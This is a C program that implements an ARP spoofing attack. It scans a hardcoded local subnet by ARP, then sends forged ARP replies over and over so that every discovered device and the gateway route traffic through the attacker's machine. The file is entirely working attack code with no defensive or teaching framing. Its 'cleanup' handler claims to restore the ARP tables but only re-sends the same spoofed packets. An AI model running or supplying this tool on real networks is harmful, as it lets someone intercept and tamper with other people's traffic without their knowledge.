#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <pthread.h>
#include <signal.h>

#define INTERFACE "enp0s3"
#define GATEWAY_IP "10.9.32.1"
#define SUBNET_MASK "255.255.255.0"
#define SCAN_TIMEOUT 2
#define SPOOF_INTERVAL 2

int running = 1;
int sockfd;
unsigned char my_mac[ETH_ALEN];
char my_ip[INET_ADDRSTRLEN];

typedef struct {
    char ip[INET_ADDRSTRLEN];
} Device;

Device *devices = NULL;
int device_count = 0;
pthread_mutex_t devices_mutex = PTHREAD_MUTEX_INITIALIZER;

void get_network_info() {
    // Get MAC address
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ-1);
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    }
    
    // Get IP address
    if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
        struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
        inet_ntop(AF_INET, &ipaddr->sin_addr, my_ip, INET_ADDRSTRLEN);
    }
    
    close(fd);
    
    printf("[*] Interface: %s\n", INTERFACE);
    printf("[*] MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
    printf("[*] IP: %s\n", my_ip);
}

void scan_network() {
    printf("[*] Scanning network...\n");
    
    // Create raw socket
    int scan_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (scan_sock < 0) {
        perror("Socket creation failed");
        return;
    }
    
    // Bind to interface
    struct ifreq ifr;
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ-1);
    if (ioctl(scan_sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("Interface binding failed");
        close(scan_sock);
        return;
    }
    
    // Prepare ARP request
    unsigned char packet[60] = {0};
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    
    // Ethernet header
    memset(eth->ether_dhost, 0xff, ETH_ALEN); // Broadcast
    memcpy(eth->ether_shost, my_mac, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);
    
    // ARP header
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy(arp->arp_sha, my_mac, ETH_ALEN);
    
    struct in_addr ip_addr;
    inet_pton(AF_INET, my_ip, &ip_addr);
    memcpy(arp->arp_spa, &ip_addr, sizeof(ip_addr));
    
    // Send ARP requests to all IPs in subnet
    char target_ip[INET_ADDRSTRLEN];
    char *last_octet = strrchr(my_ip, '.') + 1;
    int my_last_octet = atoi(last_octet);
    
    for (int i = 1; i < 255; i++) {
        if (i == my_last_octet) continue; // Skip our own IP
        
        snprintf(target_ip, INET_ADDRSTRLEN, "%.*s.%d", 
                (int)(last_octet - my_ip - 1), my_ip, i);
        
        inet_pton(AF_INET, target_ip, &ip_addr);
        memcpy(arp->arp_tpa, &ip_addr, sizeof(ip_addr));
        
        // Send packet
        struct sockaddr_ll sa;
        memset(&sa, 0, sizeof(sa));
        sa.sll_family = AF_PACKET;
        sa.sll_ifindex = ifr.ifr_ifindex;
        sa.sll_halen = ETH_ALEN;
        memcpy(sa.sll_addr, eth->ether_dhost, ETH_ALEN);
        
        sendto(scan_sock, packet, sizeof(packet), 0, 
              (struct sockaddr *)&sa, sizeof(sa));
    }
    
    // Listen for responses
    fd_set readfds;
    struct timeval tv;
    unsigned char buffer[ETH_FRAME_LEN];
    
    FD_ZERO(&readfds);
    FD_SET(scan_sock, &readfds);
    
    tv.tv_sec = SCAN_TIMEOUT;
    tv.tv_usec = 0;
    
    time_t start_time = time(NULL);
    
    while (time(NULL) - start_time < SCAN_TIMEOUT) {
        int ret = select(scan_sock + 1, &readfds, NULL, NULL, &tv);
        if (ret > 0) {
            if (FD_ISSET(scan_sock, &readfds)) {
                ssize_t len = recvfrom(scan_sock, buffer, ETH_FRAME_LEN, 0, NULL, NULL);
                if (len >= sizeof(struct ether_header) + sizeof(struct ether_arp)) {
                    struct ether_arp *arp_reply = (struct ether_arp *)(buffer + sizeof(struct ether_header));
                    if (ntohs(arp_reply->ea_hdr.ar_op) == ARPOP_REPLY) {
                        char reply_ip[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, arp_reply->arp_spa, reply_ip, INET_ADDRSTRLEN);
                        
                        // Skip gateway and our own IP
                        if (strcmp(reply_ip, GATEWAY_IP) != 0 && strcmp(reply_ip, my_ip) != 0) {
                            pthread_mutex_lock(&devices_mutex);
                            
                            // Check if device already exists
                            int found = 0;
                            for (int i = 0; i < device_count; i++) {
                                if (strcmp(devices[i].ip, reply_ip) == 0) {
                                    found = 1;
                                    break;
                                }
                            }
                            
                            if (!found) {
                                devices = realloc(devices, (device_count + 1) * sizeof(Device));
                                strncpy(devices[device_count].ip, reply_ip, INET_ADDRSTRLEN);
                                device_count++;
                                printf("[+] Found device: %s\n", reply_ip);
                            }
                            
                            pthread_mutex_unlock(&devices_mutex);
                        }
                    }
                }
            }
        }
    }
    
    close(scan_sock);
    printf("[*] Scan complete. Found %d devices.\n", device_count);
}

void send_arp_spoof(const char *target_ip, const char *spoof_ip) {
    unsigned char packet[60] = {0};
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    
    // Ethernet header
    memset(eth->ether_dhost, 0xff, ETH_ALEN); // Broadcast (will be replaced)
    memcpy(eth->ether_shost, my_mac, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);
    
    // ARP header
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = ETH_ALEN;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, my_mac, ETH_ALEN);
    
    struct in_addr ip_addr;
    inet_pton(AF_INET, spoof_ip, &ip_addr);
    memcpy(arp->arp_spa, &ip_addr, sizeof(ip_addr));
    
    // Send to target
    memset(eth->ether_dhost, 0xff, ETH_ALEN); // Broadcast (we don't know target MAC)
    inet_pton(AF_INET, target_ip, &ip_addr);
    memcpy(arp->arp_tpa, &ip_addr, sizeof(ip_addr));
    
    struct sockaddr_ll sa;
    struct ifreq ifr;
    
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("Interface index error");
        return;
    }
    
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, eth->ether_dhost, ETH_ALEN);
    
    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sa, sizeof(sa));
}

void *spoof_thread(void *arg) {
    while (running) {
        pthread_mutex_lock(&devices_mutex);
        
        for (int i = 0; i < device_count; i++) {
            // Spoof device to think we're the gateway
            send_arp_spoof(devices[i].ip, GATEWAY_IP);
            
            // Spoof gateway to think we're the device
            send_arp_spoof(GATEWAY_IP, devices[i].ip);
            
            printf("[*] Sent spoofed ARP to %s\n", devices[i].ip);
        }
        
        pthread_mutex_unlock(&devices_mutex);
        sleep(SPOOF_INTERVAL);
    }
    
    return NULL;
}

void cleanup(int sig) {
    running = 0;
    printf("\n[*] Cleaning up...\n");
    
    // Restore ARP tables
    pthread_mutex_lock(&devices_mutex);
    
    for (int i = 0; i < device_count; i++) {
        // Send correct ARP info to device
        send_arp_spoof(devices[i].ip, GATEWAY_IP);
        
        // Send correct ARP info to gateway
        send_arp_spoof(GATEWAY_IP, devices[i].ip);
    }
    
    pthread_mutex_unlock(&devices_mutex);
    
    close(sockfd);
    free(devices);
    exit(0);
}

int main() {
    signal(SIGINT, cleanup);
    
    // Get network info
    get_network_info();
    
    // Create raw socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }
    
    // Scan network
    scan_network();
    
    if (device_count == 0) {
        printf("[!] No devices found to spoof\n");
        close(sockfd);
        return 0;
    }
    
    // Start spoofing thread
    pthread_t thread;
    pthread_create(&thread, NULL, spoof_thread, NULL);
    
    printf("[*] ARP spoofing started. Press Ctrl+C to stop...\n");
    
    // Main thread just waits
    while (running) {
        sleep(1);
    }
    
    pthread_join(thread, NULL);
    close(sockfd);
    return 0;
}